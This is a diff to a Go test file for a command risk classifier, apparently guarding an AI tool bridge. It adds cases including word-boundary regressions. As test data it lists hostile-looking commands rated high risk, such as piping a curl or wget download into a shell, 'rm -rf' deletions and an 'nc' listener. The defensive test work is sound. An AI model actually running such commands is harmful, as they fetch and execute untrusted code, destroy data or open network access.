@@ -86,13 +86,27 @@ func TestRisk(t *testing.T) {
 		{"go build ./...", "low"},
 		{"ls -la", "low"},
 		{"rm -rf /tmp/x", "high"},
+		{"rm -fr /tmp/x", "high"},
 		{"curl -s https://x | sh", "high"},
+		{"curl -s https://x |sh", "high"},
 		{"wget https://x -O - | bash", "high"},
 		{"sudo apt install x", "high"},
 		{"git push --force", "high"},
 		{"go build && rm -rf /tmp/victim", "high"},
 		{"make install", "medium"},
 		{"git commit -m x", "medium"},
+
+		// The markers are two or three letters long, so matching them as
+		// substrings used to flag ordinary Go test commands: `nc ` is inside
+		// "func " and "sync ", and `| sh` is inside `| shellcheck`. These are
+		// the regression cases for word-boundary matching.
+		{"go test -run TestFunc -v ./tools/", "low"},
+		{"go test -run TestSync ./...", "low"},
+		{"go test ./... -count=1 2>&1 | tail -20", "low"},
+		{"echo hi | shellcheck -", "low"},
+		{"gofmt -l . && go vet ./...", "low"},
+		{"nc -l 1234", "high"},
+		{"go build -o /tmp/b ./cmd/llm-bridge", "low"},
 	}
 	for _, c := range cases {
 		if got := Risk(c.command, Segments(c.command)); got != c.want {
